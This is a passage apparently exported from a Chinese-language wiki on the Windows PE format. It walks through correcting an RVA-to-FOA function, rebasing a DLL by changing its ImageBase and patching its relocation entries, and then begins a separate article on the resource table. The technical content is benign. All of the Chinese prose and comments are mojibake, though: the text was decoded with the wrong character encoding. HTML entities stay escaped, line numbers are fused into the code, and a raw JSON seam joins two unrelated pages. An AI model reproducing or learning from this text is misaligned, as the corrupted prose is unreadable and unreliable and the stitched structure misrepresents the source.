é‡å®šä½è¡¨çš„HæŒ‰é”®ï¼Œå®ƒæ‰“å¼€çš„æ˜¯35000hçš„åå…­è¿›åˆ¶ç•Œé¢ç–‘é—®ï¼šå®ƒæ•°æ®ç›®å½•è¡¨é‡Œé‡å®šä½è¡¨çš„RVAæ˜¯37000hï¼ŒæŒ‡çš„åœ°æ–¹æ˜¯é”™çš„é‚£LordPEæ˜¯æ€ä¹ˆæ‰¾åˆ°æ­£ç¡®çš„ä½ç½®35000hçš„ï¼Ÿç­”æ¡ˆï¼šè¿˜æ˜¯â€œæ‹‰ä¼¸â€çš„é—®é¢˜ï¼Œä¸Šé¢ç¬¬ä¸€ç‚¹â€œæ–‡ä»¶å¯¹é½å’Œå†…å­˜å¯¹é½ä¸€æ ·ã€‚è¯´æ˜ä¸éœ€è¦RVAè½¬FOAâ€è¿™ä¸€ç‚¹å°±æ˜¯é”™çš„ã€‚å› ä¸ºä¸€ä¸ªèŠ‚å¦‚æœå«æœ‰æœªåˆå§‹åŒ–æ•°æ®ï¼Œä¼šå¯¼è‡´ç£ç›˜ä¸å ç©ºé—´ï¼Œå†…å­˜æ—¶è¦ç©ºé—´ï¼Œè¿™ä¸ªæƒ…å†µä¹Ÿä¼šå¯¼è‡´â€œæ‹‰ä¼¸â€ã€‚ç„¶åå†çœ‹äº†ä¸‹ä»£ç ï¼Œæ˜¯RVAToFOAå‡½æ•°æœ‰é—®é¢˜ï¼Œéœ€è¦ä¿®æ”¹ã€‚æŠŠä¸‹é¢çº¢æ¡†ï¼ˆæ–‡ä»¶å¯¹é½=å†…å­˜å¯¹é½ï¼‰çš„æ¡ä»¶å»æ‰ã€‚å³ä½¿æ–‡ä»¶å¯¹é½==å†…å­˜å¯¹é½ï¼Œä¹Ÿè¦ç®—èŠ‚åç§»ä¿®æ”¹åçš„RVAToFOAå‡½æ•°12345678910111213141516171819202122232425262728293031BOOL PEManipulator::RVAToFOA(DWORD dwRVA, OUT DWORD&amp; dwFOA)&#123; dwFOA = 0; // åˆå§‹åŒ– dwFOAï¼Œé˜²æ­¢warning if (dwRVA &lt; 0) //å‚æ•°æ ¡éªŒ &#123; return FALSE; &#125; //RVAåœ¨SizeOfHeadersä»¥å†… // ä¸èƒ½åŠ FileAlignment==SectionAlignmentè¿™ä¸ªæ¡ä»¶ï¼Œå³ä½¿å¯¹é½ç›¸åŒï¼Œæ–‡ä»¶ä¸­çš„å®é™…æ•°æ®å¯èƒ½ç”±äº SizeOfRawData å°äº VirtualSize è€Œä¸å®Œæ•´ã€‚ if (dwRVA &lt;= m_OptionalPeHdr-&gt;SizeOfHeaders ) &#123; dwFOA = dwRVA; return TRUE; &#125; //åœ¨èŠ‚è¡¨ä¸­ for (int i = 0; i &lt; m_PeHdr-&gt;NumberOfSections; i++) &#123; if (m_SecHdr[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; m_SecHdr[i].VirtualAddress + m_SecHdr[i].Misc.VirtualSize) &#123; //èŠ‚.PointerToRawData + å·®å€¼ //å·®å€¼=RVA-èŠ‚.VirtualAddress dwFOA = m_SecHdr[i].PointerToRawData + (dwRVA - m_SecHdr[i].VirtualAddress); return TRUE; &#125; &#125; return TRUE;&#125;å¦‚æœæ›´ä¸¥è°¨ç‚¹ï¼Œè¾“å…¥çš„RVAåœ¨æ–‡ä»¶ä¸­å¯èƒ½æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œå³RVAè¶…å‡ºäº†SizeOfRawDataã€‚æ‰€ä»¥ç®—å®é™…çš„FOAå‰ï¼Œè¦åˆ¤æ–­ä¸‹RVAæ˜¯å¦è¶…å‡ºäº†SizeOfRawDataã€‚12345678910111213141516171819202122232425262728293031323334353637383940BOOL PEManipulator::RVAToFOA(DWORD dwRVA, OUT DWORD&amp; dwFOA)&#123; dwFOA = 0; // åˆå§‹åŒ– dwFOAï¼Œé˜²æ­¢warning if (dwRVA &lt; 0) //å‚æ•°æ ¡éªŒ &#123; return FALSE; &#125; //RVAåœ¨SizeOfHeadersä»¥å†… // ä¸èƒ½åŠ FileAlignment==SectionAlignmentè¿™ä¸ªæ¡ä»¶ï¼Œå³ä½¿å¯¹é½ç›¸åŒï¼Œæ–‡ä»¶ä¸­çš„å®é™…æ•°æ®å¯èƒ½ç”±äº SizeOfRawData å°äº VirtualSize è€Œä¸å®Œæ•´ã€‚ if (dwRVA &lt;= m_OptionalPeHdr-&gt;SizeOfHeaders ) &#123; dwFOA = dwRVA; return TRUE; &#125; //åœ¨èŠ‚è¡¨ä¸­ for (int i = 0; i &lt; m_PeHdr-&gt;NumberOfSections; i++) &#123; if (m_SecHdr[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; m_SecHdr[i].VirtualAddress + m_SecHdr[i].Misc.VirtualSize) &#123; // æ£€æŸ¥RVAæ˜¯å¦è¶…å‡ºèŠ‚çš„åŸå§‹æ•°æ®å¤§å° if (dwRVA &gt;= m_SecHdr[i].VirtualAddress + m_SecHdr[i].SizeOfRawData) &#123; printf(&quot;[-] Error: RVA 0x%08X is beyond the raw data size of section %d. &quot;, dwRVA, i); return FALSE; &#125; //èŠ‚.PointerToRawData + å·®å€¼ //å·®å€¼=RVA-èŠ‚.VirtualAddress dwFOA = m_SecHdr[i].PointerToRawData + (dwRVA - m_SecHdr[i].VirtualAddress); return TRUE; &#125; &#125; // å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„èŠ‚ printf(&quot;[-] Error: RVA 0x%08X does not correspond to any valid section. &quot;, dwRVA); return FALSE;&#125; ä¿®å¤é‡å®šä½æ•°æ® ç¼–ç¨‹å®ç°ï¼šæ ¹æ®é‡å®šä½è¡¨å»ä¿®å¤é‡å®šä½æ•°æ®ã€‚ åˆ¶é€ éœ€è¦ä¿®æ”¹çš„æ¡ä»¶ï¼šä¿®æ”¹Dllçš„ImageBase éªŒè¯æ˜¯å¦ä¿®æ­£æˆåŠŸï¼šå†æ¬¡ä½¿ç”¨ä¿®æ”¹åçš„Dllï¼Œçœ‹è¿™ä¸ªDllæ˜¯å¦å¯ä»¥æ­£å¸¸ä½¿ç”¨ æµ‹è¯•ç”¨ä¾‹ï¼š dllæ–‡ä»¶ å¤‡æ³¨ VCç¼–è¯‘çš„dll æ–‡ä»¶å¯¹é½1000hï¼Œå†…å­˜å¯¹é½1000h VSç¼–è¯‘çš„dll æ–‡ä»¶å¯¹é½200hï¼Œå†…å­˜å¯¹é½1000h è®¾è®¡çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ï¼š å…ˆä½¿ç”¨dllä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œç¡®ä¿dllèƒ½æ­£å¸¸ä½¿ç”¨ ä¿®æ”¹è¿™ä¸ªdllçš„ImageBaseä¸ºå…¶ä»–å€¼ï¼Œä¿®å¤é‡å®šä½æ•°æ®ï¼Œå­˜ç›˜ å†ä½¿ç”¨ä¿®æ”¹åçš„dllä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œçœ‹æ˜¯å¦èƒ½æ­£å¸¸ä½¿ç”¨ æ­¥éª¤1å’Œ3éƒ½æ˜¯ä½¿ç”¨dllä¸­çš„å¯¼å‡ºå‡½æ•°ï¼ŒåŠŸèƒ½ä¸€æ ·ï¼Œå†™æˆä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªæ–‡ä»¶è·¯å¾„å‚æ•° 1BOOL UseExportedFunctionsFromDLL(LPCSTR DllPath) å¤§è‡´æµç¨‹123456789101112131415161718192021222324252627282930313233343536//æµ‹è¯•ä¿®å¤é‡å®šä½è¡¨int TestFixRelocationTable()&#123; //1ã€æ­£å¸¸ä½¿ç”¨dllä¸­çš„å¯¼å‡ºå‡½æ•° printf(&quot;[*] Using functions from DLL with original ImageBase... &quot;); UseExportedFunctionsFromDLL(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VCçš„ //UseExportedFunctionsFromDLL(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ //2ã€ æš‚åœï¼Œæç¤ºç”¨æˆ·å³å°†ä¿®æ”¹ImageBaseå’Œä¿®å¤é‡å®šä½æ•°æ® printf(&quot;[*] Press any key to modify the ImageBase to 0x30000000 and fix relocations... &quot;); getchar(); //3ã€ä¿®æ”¹ImageBaseå¹¶ä¿®å¤é‡å®šä½æ•°æ® PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC.dll&quot;); //VCçš„ //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VSçš„ if (!PEFile.MapPEFile() || !PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; // 4ã€ä¿®æ”¹ImageBaseå¹¶ä¿®å¤é‡å®šä½æ•°æ® if (!PEFile.ChangeImageBaseAndFixRelocations(0x30000000)) &#123; printf(&quot;[-] Failed to change ImageBase and fix relocations. &quot;); return 1; &#125; // 5ã€æš‚åœï¼Œæç¤ºç”¨æˆ·å³å°†å°è¯•ä½¿ç”¨ä¿®æ”¹åçš„dllä¸­çš„å¯¼å‡ºå‡½æ•° printf(&quot;[+] Press any key to attempt using functions from the DLL after modifying ImageBase... &quot;); getchar(); UseExportedFunctionsFromDLL(&quot;E:\\\\temp\\\\Export Table\\\\MyTest_VC_NewImageBase.dll&quot;); //VCçš„ //UseExportedFunctionsFromDLL(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll_NewImageBase.dll&quot;); //VSçš„ return 0;&#125; UseExportedFunctionsFromDLLä½¿ç”¨dllä¸­çš„å¯¼å‡ºå‡½æ•°ChangeImageBaseAndFixRelocationsä¿®æ”¹ImageBase+ä¿®æ­£æ•°æ®+å­˜ç›˜æ˜¾å¼åŠ è½½dllå¹¶ä½¿ç”¨é‡Œé¢çš„å¯¼å‡ºå‡½æ•° LoadLibraryAå°±æ˜¯å°†dllåŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­ï¼Œå¦‚æœç”¨ODçœ‹çš„è¯ï¼Œæ‰§è¡ŒLoadLibraryA(DllPath)åï¼Œâ€œEâ€æŒ‰é’®æ¨¡å—ä¼šå¤šå‡ºåŠ è½½çš„dllã€‚è¿™ä¸ªdllåŠ è½½åŸºå€æ˜¯ImageBaseï¼ˆå¦‚æœåŸºå€æ²¡æœ‰éšæœºåŠ è½½çš„è¯ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061BOOL UseExportedFunctionsFromDLL(LPCSTR DllPath)&#123; // åŠ¨æ€åŠ è½½DLLåˆ°å†…å­˜ä¸­ HMODULE hModule = LoadLibraryA(DllPath); if (hModule == NULL) &#123; printf(&quot;[!] Failed to load %s &quot;, DllPath); return FALSE; &#125; // æ‰“å°åŠ è½½çš„DLLçš„åŸºåœ°å€ printf(&quot;Loaded DLL at base address: 0x%p &quot;, hModule); // è·å–å¹¶éªŒè¯å‡½æ•°åœ°å€ fpPlus myPlus = (fpPlus)GetProcAddress(hModule, &quot;Plus&quot;); if (!myPlus) &#123; printf(&quot;[!] Failed to get the address of Plus &quot;); FreeLibrary(hModule); return FALSE; &#125; fpSub mySub = (fpSub)GetProcAddress(hModule, (LPCSTR)16); if (!mySub) &#123; printf(&quot;[!] Failed to get the address of Sub(NOMANE) &quot;); FreeLibrary(hModule); return FALSE; &#125; fpMul myMul = (fpMul)GetProcAddress(hModule, &quot;Mul&quot;); if (!myMul) &#123; printf(&quot;[!] Failed to get the address of Mul &quot;); FreeLibrary(hModule); return FALSE; &#125; fpDiv myDiv = (fpDiv)GetProcAddress(hModule, &quot;Div&quot;); if (!myDiv) &#123; printf(&quot;[!] Failed to get the address of Div &quot;); FreeLibrary(hModule); return FALSE; &#125; // è°ƒç”¨å‡½æ•° int a = myPlus(10, 2); int b = mySub(10, 2); int c = myMul(10, 2); int d = myDiv(10, 2); printf(&quot;Results: &quot;); printf(&quot; Plus: %4d &quot;, a); printf(&quot; Sub (NONAME): %4d &quot;, b); printf(&quot; Mul: %4d &quot;, c); printf(&quot; Div: %4d &quot;, d); // é‡Šæ”¾DLL FreeLibrary(hModule); return TRUE;&#125;ChangeImageBaseAndFixRelocationså‡½æ•°å®ç°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869BOOL PEManipulator::ChangeImageBaseAndFixRelocations(DWORD dwNewImageBase)&#123; //1ã€ç”³è¯·ä¸€å—NewBufferï¼Œå°†FileBufferåŸå°ä¸åŠ¨æ‹·è¿‡å» DWORD dwOriginalBufferSize = CalculateUnstretchedPESize(); LPVOID lpNewBuffer = new BYTE[dwOriginalBufferSize](); //since C++11 ,it&#x27;s ok printf(&quot;[+] new for NewBuffer successfully. &quot;); memcpy(lpNewBuffer, m_lpFileBuffer, dwOriginalBufferSize); printf(&quot;[+] Allocated and copied original PE to new buffer. &quot;); //2ã€åœ¨NewBufferåŸºç¡€ä¸Šä¿®æ”¹ImageBaseï¼Œå¹¶ä¿®æ­£é‡å®šä½æ•°æ® // ä¿®æ”¹PEå¤´ä¸­çš„ImageBase PIMAGE_OPTIONAL_HEADER32 pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); if (!pOptionalPeHdr_NewBuffer) &#123; delete[] lpNewBuffer; return FALSE; &#125; DWORD dwOldImageBase = pOptionalPeHdr_NewBuffer-&gt;ImageBase; pOptionalPeHdr_NewBuffer-&gt;ImageBase = dwNewImageBase; printf(&quot;[*] Changed ImageBase from 0x%08X to 0x%08X. &quot;, dwOldImageBase, dwNewImageBase); // ä¿®å¤é‡å®šä½æ•°æ® auto pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpNewBuffer); if (!pBaseReloc_NewBuffer) &#123; delete[] lpNewBuffer; printf(&quot; [-] No Base Relocation Table found. &quot;); return FALSE; &#125; int iBlockIndex = 0; // ç¬¬å‡ ä¸ªé‡å®šä½å— while (pBaseReloc_NewBuffer-&gt;VirtualAddress &amp;&amp; pBaseReloc_NewBuffer-&gt;SizeOfBlock) &#123; iBlockIndex++; // è°ƒè¯•ç”¨ PWORD pTypeOffset = (PWORD)(pBaseReloc_NewBuffer + 1); //TypeOffsetæ•°ç»„çš„æŒ‡é’ˆ DWORD dwEntryCount = (pBaseReloc_NewBuffer-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (DWORD i = 0; i &lt; dwEntryCount; i++) &#123; DWORD wType = pTypeOffset[i] &gt;&gt; 12; //é«˜4ä½æ˜¯ç±»å‹ DWORD wOffset = pTypeOffset[i] &amp; 0x0FFF; //ä½12ä½æ˜¯åç§» if (wType == IMAGE_REL_BASED_HIGHLOW) // å¯¹äº HIGHLOW ç±»å‹æ˜¯æ•°æ®ï¼Œè¿›è¡Œä¿®æ­£ &#123; DWORD dwFullRVA = pBaseReloc_NewBuffer-&gt;VirtualAddress + wOffset; DWORD dwFullFOA = 0; if (!RVAToFOA(dwFullRVA, dwFullFOA)) &#123; delete[] lpNewBuffer; return FALSE; &#125; //ä¿®æ­£æ•°æ® auto pPatchAddr = (PDWORD)((DWORD)lpNewBuffer + dwFullFOA); *pPatchAddr = *pPatchAddr - dwOldImageBase + dwNewImageBase; &#125; &#125; //ä¸‹ä¸€ä¸ªé‡å®šä½å— pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc_NewBuffer + pBaseReloc_NewBuffer-&gt;SizeOfBlock); &#125; //3ã€ ä¿å­˜ä¿®æ”¹åçš„å†…å­˜åˆ°æ–°æ–‡ä»¶ä¸­ if (!SaveUnstretchedPEToDisk(lpNewBuffer, &quot;NewImageBase&quot;)) &#123; return FALSE; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return TRUE;&#125; è®²è§£å¦‚ä¸‹ï¼š PEManipulatorç±»ä¸­æ–°å¢ä¸€ä¸ªå‡½æ•°ChangeImageBaseAndFixRelocationsï¼Œè´Ÿè´£ä¿®æ”¹dllä¸­ImageBaseå¹¶å­˜ç›˜ 1BOOL ChangeImageBaseAndFixRelocations(DWORD dwNewImageBase); ChangeImageBaseAndFixRelocationså‡½æ•°å®ç°æ­¥éª¤ä¸ºï¼š å…ˆç”³è¯·ä¸€å—NewBufferï¼Œå°†åŸæ–‡ä»¶å†…å­˜æ˜ åƒæ‹·è¿‡å» åœ¨NewBufferçš„åŸºç¡€ä¸Šä¿®æ”¹ImageBaseï¼Œå¹¶æ ¹æ®é‡å®šä½è¡¨ä¿®æ­£é‡å®šä½æ•°æ® å­˜ç›˜ æ¯ä¸€æ­¥çš„å®ç°å¦‚ä¸‹ï¼š ç”³è¯·NewBufferå¹¶æ‹·è´åŸæ•°æ® 123456//1ã€ç”³è¯·ä¸€å—NewBufferï¼Œå°†FileBufferåŸå°ä¸åŠ¨æ‹·è¿‡å»DWORD dwOriginalBufferSize = CalculateUnstretchedPESize();LPVOID lpNewBuffer = new BYTE[dwOriginalBufferSize](); //since C++11 ,it&#x27;s okprintf(&quot;[+] new for NewBuffer successfully. &quot;);memcpy(lpNewBuffer, m_lpFileBuffer, dwOriginalBufferSize);printf(&quot;[+] Allocated and copied original PE to new buffer. &quot;); ä¿®æ”¹ImageBase åé¢ä¿®æ­£æ•°æ®æ—¶è¦ç”¨åˆ°æ—§çš„ImageBaseï¼Œæ‰€ä»¥è¦ç”¨ä¸ªå˜é‡å­˜ä¸€ä¸‹ã€‚å¦åˆ™ImageBaseä¿®æ”¹ä¸ºæ–°çš„ï¼Œåé¢ç”¨pOptionalPeHdr_NewBuffer-&gt;ImageBaseè¿™ä¸ªå°±æ˜¯æ–°çš„ImageBaseçš„å€¼äº† 1234567891011//2ã€åœ¨NewBufferåŸºç¡€ä¸Šä¿®æ”¹ImageBaseï¼Œå¹¶ä¿®æ­£é‡å®šä½æ•°æ® // ä¿®æ”¹PEå¤´ä¸­çš„ImageBasePIMAGE_OPTIONAL_HEADER32 pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);if (!pOptionalPeHdr_NewBuffer)&#123; delete[] lpNewBuffer; return FALSE;&#125;DWORD dwOldImageBase = pOptionalPeHdr_NewBuffer-&gt;ImageBase;pOptionalPeHdr_NewBuffer-&gt;ImageBase = dwNewImageBase;printf(&quot;[*] Changed ImageBase from 0x%08X to 0x%08X. &quot;, dwOldImageBase, dwNewImageBase); ä¿®æ­£é‡å®šä½æ•°æ® 1234567891011121314151617181920212223242526272829303132333435363738 // ä¿®å¤é‡å®šä½æ•°æ®auto pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_BASERELOC, lpNewBuffer);if (!pBaseReloc_NewBuffer)&#123; delete[] lpNewBuffer; printf(&quot; [-] No Base Relocation Table found. &quot;); return FALSE;&#125;int iBlockIndex = 0; // ç¬¬å‡ ä¸ªé‡å®šä½å— while (pBaseReloc_NewBuffer-&gt;VirtualAddress &amp;&amp; pBaseReloc_NewBuffer-&gt;SizeOfBlock)&#123; iBlockIndex++; // è°ƒè¯•ç”¨ PWORD pTypeOffset = (PWORD)(pBaseReloc_NewBuffer + 1); //TypeOffsetæ•°ç»„çš„æŒ‡é’ˆ DWORD dwEntryCount = (pBaseReloc_NewBuffer-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (DWORD i = 0; i &lt; dwEntryCount; i++) &#123; DWORD wType = pTypeOffset[i] &gt;&gt; 12; //é«˜4ä½æ˜¯ç±»å‹ DWORD wOffset = pTypeOffset[i] &amp; 0x0FFF; //ä½12ä½æ˜¯åç§» if (wType == IMAGE_REL_BASED_HIGHLOW) // å¯¹äº HIGHLOW ç±»å‹æ˜¯æ•°æ®ï¼Œè¿›è¡Œä¿®æ­£ &#123; DWORD dwFullRVA = pBaseReloc_NewBuffer-&gt;VirtualAddress + wOffset; DWORD dwFullFOA = 0; if (!RVAToFOA(dwFullRVA, dwFullFOA)) &#123; delete[] lpNewBuffer; return FALSE; &#125; //ä¿®æ­£æ•°æ® auto pPatchAddr = (PDWORD)((DWORD)lpNewBuffer + dwFullFOA); *pPatchAddr = *pPatchAddr - dwOldImageBase + dwNewImageBase; &#125; &#125; //ä¸‹ä¸€ä¸ªé‡å®šä½å— pBaseReloc_NewBuffer = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseReloc_NewBuffer + pBaseReloc_NewBuffer-&gt;SizeOfBlock);&#125; è¿™é‡Œæä¸‹ä¿®æ­£æ•°æ®é‚£é‡Œ 123456789101112131415å‡è®¾åŸæ¥çš„ImageBaseæ˜¯0x10000000å†™æ­»çš„åœ°å€æ˜¯0x10003456ç°åœ¨æ–°çš„ImageBaseæ˜¯0x20000000é‚£ä¹ˆè¿™æ ·æ”¹ï¼š 1ã€è®©å†™æ­»çš„åœ°å€å‡å»åŸImageBase 2ã€å†åŠ ä¸Šæ–°ImageBase ï¼ˆä¸ç”¨æƒ³ç€å…ˆç®—æ–°ImageBaseå’ŒåŸImageBaseå·®å€¼æ­£æ•°è¿˜æ˜¯è´Ÿæ•°ï¼Œä»€ä¹ˆè¡¥ç ä»€ä¹ˆçš„ï¼‰å³ï¼š 0x10003456-0x10000000+0x20000000ä»£ç å°±æ˜¯ *pPatchAddr = *pPatchAddr - dwOldImageBase + dwNewImageBase; å­˜ç›˜ 123456//3ã€ ä¿å­˜ä¿®æ”¹åçš„å†…å­˜åˆ°æ–°æ–‡ä»¶ä¸­if (!SaveUnstretchedPEToDisk(lpNewBuffer, &quot;NewImageBase&quot;))&#123; return FALSE;&#125;printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); è¿è¡Œ VCçš„dllVSçš„dllVSç¼–è¯‘çš„dlléœ€è¦ç»™PEå¤´é‡ŒCharacteristicsåŠ ä¸ŠIMAGE_FILE_RELOCS_STRIPPEDå±æ€§ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸­ä¸å­˜åœ¨é‡å®šä½ä¿¡æ¯ï¼Œè¿™æ ·è¿™ä¸ªdllåŠ è½½æ—¶ä¼šå¼ºåˆ¶æŒ‰ImageBaseåŠ è½½ã€‚å¦åˆ™åŠ è½½åŸºå€æ˜¯éšæœºçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿ç¨‹åºå°†å®ƒçš„åŸºå€ä¿®æ”¹ç„¶åä¿®æ­£äº†æ•°æ®ï¼Œç»“æœäººå®¶åŠ è½½è¿›exeæ—¶éšæœºé€‰äº†ä¸ªåœ°å€ï¼Œç”±ç³»ç»Ÿåˆä¿®æ­£äº†ä¸€éã€‚ è¿™æ ·å°±å¯ä»¥äº†"},{"title":"èµ„æºè¡¨","path":"/wiki/PE/èµ„æºè¡¨.html","content":"å‰è¨€ åœ¨å†™ç•Œé¢ç¨‹åºæ—¶ï¼Œæ¯”å¦‚åœ¨win32é‚£é‡Œæˆ‘ä»¬ç”¨èµ„æºæ–‡ä»¶çš„æ–¹å¼æ¥åˆ›å»ºå›¾æ ‡ï¼Œé‚£ä¹ˆä¸€ä¸ªç¨‹åºä¸­å„ç§ç•Œé¢ä¸Šçš„èµ„æºåœ¨exeä¸­çš„å“ªé‡Œï¼Ÿèµ„æºè¡¨å°±æ˜¯ç”¨äºæè¿°exeä¸­è¿™äº›èµ„æºä¿¡æ¯çš„ä¸€å¼ è¡¨ã€‚ è‰ç¨¿ï¼šæ¯”å¦‚â€œèœå•â€èµ„æºç±»å‹ä¸‹ï¼Œå¯èƒ½æœ‰â€œIDM_OPENâ€ï¼ˆIDå·ä¸º2001ï¼‰ï¼Œâ€œIDM_EXITâ€ï¼ˆIDå·ä¸º2002ï¼‰ç­‰èœå•é¡¹ã€‚ èµ„æºç»“æ„ èµ„æºç»“æ„ç±»ä¼¼äºç£ç›˜æ–‡ä»¶ç³»ç»Ÿï¼Œæ–‡ä»¶å¤¹ä¸‹æœ‰æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸‹è¿˜æœ‰æ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å°±æ˜¯çœŸæ­£çš„èµ„æºæ•°æ®ã€‚ èµ„æºç»“æ„ç”±ä¸€å±‚ä¸€å±‚çš„èµ„æºç›®å½•å—/èŠ‚ç‚¹/èµ„æºç›®å½•ç»“æ„å•å…ƒç»„æˆã€‚æ¯ä¸ªç›®å½•å—/èŠ‚ç‚¹ç”±èµ„æºç›®å½•å¤´å’Œç´§éšå…¶åçš„èµ„æºç›®å½•é¡¹ç»„æˆï¼ˆå®ƒæœ‰å‡ é¡¹æ˜¯ä¸ç¡®å®šçš„ï¼Œæ‰€ä»¥éœ€è¦ç”¨ä¸€ä¸ªç›®å½•æ¥æè¿°ï¼‰ã€‚èµ„æºç»“æ„ä»è®¾è®¡ä¸Šæ¥è¯´ï¼Œç†è®ºä¸Šæ”¯æŒnå¤šå±‚ã€‚ä½†ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ˜¯ä¸‰å±‚ï¼Œç¬¬ä¸€å±‚è¡¨ç¤ºèµ„æºçš„ç±»å‹ï¼Œç¬¬äºŒå±‚æŒ‰èµ„æºçš„IDåˆ†ç±»ï¼Œç¬¬ä¸‰å±‚æŒ‰èµ„æºçš„ä»£ç é¡µåˆ†ç±»ï¼Œç¬¬ä¸‰å±‚åæ˜¯â€œæ–‡ä»¶â€ï¼Œè¿™é‡Œçš„â€œæ–‡ä»¶â€æ˜¯æŒ‡é€šè¿‡OffsetToDataæŒ‡è¿‡æ¥åçš„åœ°æ–¹ï¼Œå¯¹æ‰€æœ‰èµ„æºæ•°æ®å—çš„è§£æå’Œè®¿é—®å°±ä»è¿™é‡Œå¼€å§‹ã€‚æ¯ä¸€å±‚çš„èŠ‚ç‚¹éƒ½æ˜¯èµ„æºç›®å½•å—è¿™ä¸ªæ•°æ®ç»“æ„ï¼Œè€Œåœ¨ä¸åŒå±‚çº§ï¼Œè¿™ä¸ªèµ„æºç›®å½•å—ä¸­å­—æ®µçš„å«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ã€‚ï¼ˆåé¢ä¼šè®²ï¼‰ èµ„æºè¡¨å›¾ç¤ºï¼ˆæ•´ä½“ç»“æ„ï¼‰èµ„æºè¡¨å›¾ç¤ºï¼ˆè¯¦ç»†ç‰ˆï¼‰ ä»æ‹“å±•PEå¤´.æ•°æ®ç›®å½•è¡¨æ•°æ®çš„ç¬¬3ä¸ªæˆå‘˜å¾—åˆ°èµ„æºè¡¨çš„èµ·å§‹åœ°å€ï¼ˆè¿™ä¸ªå€¼æ˜¯RVAï¼‰å’Œå¤§å°ã€‚ 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; å°†RVAè½¬ä¸ºFOAåï¼Œæ‰¾è¿‡å»çš„æ˜¯ç¬¬ä¸€çº§çš„èµ„æºç›®å½•å—ã€‚ èµ„æºç›®å½•å¤´123456789typedef struct _IMAGE_RESOURCE_DIRECTORY &#123; DWORD Characteristics; // èµ„æºå±æ€§ ä¿ç•™ ä¸º0 DWORD TimeDateStamp; // åˆ›å»ºè¯¥èµ„æºçš„æ—¶é—´ WORD MajorVersion; // èµ„æºç‰ˆæœ¬å·ã€‚æœªä½¿ç”¨ï¼Œä¸º0 WORD MinorVersion; // èµ„æºç‰ˆæœ¬å·ã€‚æœªä½¿ç”¨ï¼Œä¸º0 WORD NumberOfNamedEntries; // ä»¥åç§°å‘½åçš„èµ„æºä¸ªæ•° WORD NumberOfIdEntries; // ä»¥IDå‘½åçš„èµ„æºä¸ªæ•°// IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY; èµ„æºç›®å½•å¤´IMAGE_RESOURCE_DIRECTORYä¸­æœ€é‡è¦çš„å­—æ®µæ˜¯NumberOfNamedEntrieså’ŒNumberOfIdEntriesï¼Œå®ƒä¿©ä¹‹å’Œçš„æ•°é‡ï¼Œå°±æ˜¯ç´§éšå…¶åèµ„æºç›®å½•é¡¹çš„æ•°é‡ã€‚ åœ¨.rcä¸­å®šä¹‰èµ„æºæ—¶ï¼Œæ—¢å¯ä»¥ç”¨å­—ç¬¦ä¸²åç§°æ¥æ ‡è¯†ä¸€ä¸ªèµ„æºï¼Œä¹Ÿå¯ä»¥ç”¨IDå·æ¥æ ‡è¯†ä¸€ä¸ªèµ„æºã€‚ åœ¨ä»£ç ä¸­ä½¿ç”¨èµ„æºæ—¶ï¼Œæ—¢å¯ä»¥ç”¨å­—ç¬¦ä¸²åç§°æ¥ä½¿ç”¨ä¸€ä¸ªèµ„æºï¼Œä¹Ÿå¯ä»¥ç”¨IDå·æ¥ä½¿ç”¨ä¸€ä¸ªèµ„æºã€‚ é‚£ä¹ˆåœ¨èµ„æºç›®å½•å¤´è¿™é‡Œçš„å­—æ®µï¼Œå°±å¯¹åº”ä¸Šäº†ï¼ŒNumberOfNamedEntriesç”¨äºè¡¨ç¤ºä»¥åç§°å‘½åçš„èµ„æºä¸ªæ•°ï¼ŒNumberOfIdEntriesç”¨äºè¡¨ç¤ºä»¥IDå‘½åçš„èµ„æºä¸ªæ•°ã€‚ 